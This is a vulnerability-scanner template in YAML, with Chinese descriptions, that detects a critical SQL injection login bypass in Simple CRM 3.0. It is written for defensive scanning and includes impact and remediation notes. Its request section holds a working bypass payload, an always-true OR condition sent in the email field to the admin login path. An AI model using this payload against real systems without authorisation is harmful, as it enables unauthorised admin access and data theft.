id: simple-crm-sql-injection

info:
  name: Simple CRM 3.0 - SQL 注入漏洞
  author: geeknik
  severity: critical
  description: |
    该模板用于检测 Simple CRM 3.0 - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/scrm/crm/admin` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://packetstormsecurity.com/files/163254/simplecrm30-sql.txt
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  metadata:
    max-request: 1
  tags: packetstorm,sqli,simplecrm,auth-bypass,injection,vuln

http:
  - method: POST
    path:
      - "{{BaseURL}}/scrm/crm/admin"

    body: "email='+or+2>1+--+&password=&login="

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "<script>window.location.href='home.php'</script>"
        part: body

      - type: word
        words:
          - "text/html"
        part: header
